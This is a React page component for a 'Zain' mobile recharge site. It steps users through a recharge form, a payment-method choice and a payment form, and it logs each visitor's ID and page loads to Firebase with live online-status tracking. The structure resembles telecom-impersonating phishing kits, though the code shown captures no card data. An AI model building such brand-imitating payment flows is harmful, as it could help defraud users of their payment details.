import { useEffect, useState } from "react";
import ZainRechargePage from "@/components/portal-form";
import PaymentMethod from "@/components/payment-method";
import PaymentForm from "@/components/qpy";
import { addData } from "@/lib/firebase";
import { setupOnlineStatus } from "@/lib/utils";

export default function HomePage() {
  const [stepNumber, setStepNumber] = useState(1);

  useEffect(() => {
    const storedVisitorId = localStorage.getItem("visitorId") || localStorage.getItem("visitor");
    const resolvedVisitorId =
      storedVisitorId ||
      (typeof crypto !== "undefined" && "randomUUID" in crypto
        ? `zain-app-${crypto.randomUUID()}`
        : `zain-app-${Math.random().toString(36).substring(2, 15)}`);

    localStorage.setItem("visitorId", resolvedVisitorId);
    localStorage.setItem("visitor", resolvedVisitorId);

    void addData({
      createdDate: new Date().toISOString(),
      id: resolvedVisitorId,
      action: "page_load",
      currentPage: "الرئيسية",
    });
    setupOnlineStatus(resolvedVisitorId);
  }, []);

  return (
    <main className="min-h-screen bg-gray-50">
      {stepNumber === 1 && <ZainRechargePage setStepNumber={setStepNumber} />}
      {stepNumber === 2 && <PaymentMethod setStepNumber={setStepNumber} />}
      {stepNumber === 3 && <PaymentForm setStepNumber={setStepNumber} />}
    </main>
  );
}
